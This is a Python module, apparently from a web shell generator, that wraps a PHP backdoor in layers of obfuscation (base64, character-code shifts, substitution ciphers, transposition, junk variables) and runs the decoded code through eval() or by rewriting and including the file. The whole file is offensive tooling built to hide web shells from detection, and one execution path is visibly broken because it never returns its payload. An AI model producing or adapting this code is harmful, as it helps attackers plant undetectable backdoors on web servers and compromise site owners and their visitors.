#! /usr/bin/python

from shell import Shell  
from util import Encoders, Junk, PhpParser 


class Php(Shell): 
	
	php_reserved = [ '$GLOBALS', '$_SERVER', '$_REQUEST', '$_POST', '$_GET', '$_FILES', '$_ENV', '$_COOKIE', '$_SESSION', '$argc', '$argv', '$this->' ] 
	
	def __init__(self, path = None):
		Shell.__init__(self, 'php')
		self.shell_path = self.Path.php if path == None else path
		self.shell_text = self.Read(self.shell_path)
	
	def Create(self, payload, add_junk = False): 
		shell = self.Execution(payload) 
		if add_junk : shell = ''.join(line + ' \n' + Junk().Php([ '$' + self.makeVars() for _ in range(4) ])[self.rndInt(1, 5)] + '\n' for line in shell.split(' \n'))
		shell = '<?php \n' + shell +  '?>' 
		return shell
	
	def Execution(self, code, method = 'eval'): 
		if method == 'eval' : return code + 'eval( ' + self.vars[-1] + ' ); \n' 
		self.vars += [ '$' + self.makeVars() for _ in range(2) ]
		payload = self.vars[-2] + ' = __file__; \n' 
		payload += self.vars[-1] + 'file_get_contents(' + self.vars[-2] + '); \n' 
		payload += code 
		payload += 'file_put_contents(' + self.vars[-2] + ', "<?php \n" . ' + code + ' . "?>"); \n' 
		payload += 'include( ' + self.vars[-2] + ' ) \n;' 
		payload += 'file_put_contents(' + self.vars[-2] + ', ' + self.vars[-1] + '); \n' 
	
	def Base64(self, add_junk = False): 
		shell_encoded = Encoders(PhpParser(self.shell_text).StripTags()).Base64()
		junk = self.makeJunk(shell_encoded + 'base64_decode', self.an_chars) 
		vals = self.makeVals(shell_encoded, junk)
		self.vars += [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i] + '" ; \n' for i in range(len(vals)) ])
		payload += self.vars[1] + ' = str_replace( "' + junk + '", "", ' + self.vars[0] + ' ); \n' 
		payload += self.vars[2] + ' = str_replace( "' + junk + '", "", ' + junk.join([ c for c in '"base64_decode"' ]) + ' ); \n' 
		payload += self.vars[3] + ' = ' + self.vars[2] + '( ' + self.vars[1] + ' ); \n' 
		
		shell = self.Create(payload, add_junk) 
		return shell
	
	def OrdPlus(self, add_junk = False): 
		shell_encoded, ord_plus, chr_join = Encoders(PhpParser(self.shell_text).StripTags()).OrdPlus()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(3) ]
		
		payload = self.vars[2] + ' = ""; \n'
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i] + '"; \n' for i in range(len(vals))]) 
		payload += 'foreach(explode("' + chr_join + '", ' + self.vars[0] + ') as ' + self.vars[1] + ') ' + self.vars[2] + ' .= chr(' + self.vars[1] + ' - ' + str(ord_plus) + '); \n' 
		
		shell = self.Create(payload, add_junk) 
		return shell
	
	def Random(self, add_junk = False): 
		shell_encoded, cs1, cs2 = Encoders(PhpParser(self.shell_text).StripTags()).Random()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[3] + ' = ""; \n' 
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i].encode('unicode-escape').replace('"', '\\"').replace("$", "\\$") + '"; \n' for i in range(len(vals)) ]) 
		payload += self.vars[1] + ' = "' + cs1.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$") + '"; \n' 
		payload += self.vars[2] + ' = "' + cs2.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$") + '"; \n' 
		payload += 'foreach(str_split(' + self.vars[0] + ') as $c) { ' + self.vars[3] + ' .= (strpos(' + self.vars[2] + ', $c) === false) ? $c : ' + self.vars[1] + '[strpos(' + self.vars[2] + ', $c)]; } \n'
		
		shell = self.Create(payload, add_junk) 
		return shell
	
	def RotPlus(self, add_junk = False): 
		shell_encoded, rows = Encoders(PhpParser(self.shell_text).StripTags()).Rot90()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[1] + ' = ' + str(rows) + '; \n' 
		payload += self.vars[2] + ' = array(); \n' 
		payload += self.vars[0] + ' = "" ; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + vals[i].encode('unicode-escape').replace('"', '\\"').replace("$", "\\$") + '"; \n' for i in range(len(vals)) ]) 
		payload += 'for($i = 0; $i < ' + self.vars[1] + '; $i++) ' + self.vars[2] + '[] = ""; \n' 
		payload += 'for($i = 0; $i < (strlen(' + self.vars[0] + ') / ' + self.vars[1] + '); $i++) { for($r = 0; $r < ' + self.vars[1] + '; $r++) ' + self.vars[2] + '[$r] .= ' + self.vars[0] + '[$r + $i * ' + self.vars[1] + ']; } \n' 
		payload += self.vars[3] + ' = trim(implode("", ' + self.vars[2] + ')); \n' 
		
		shell = self.Create(payload, add_junk) 
		return shell

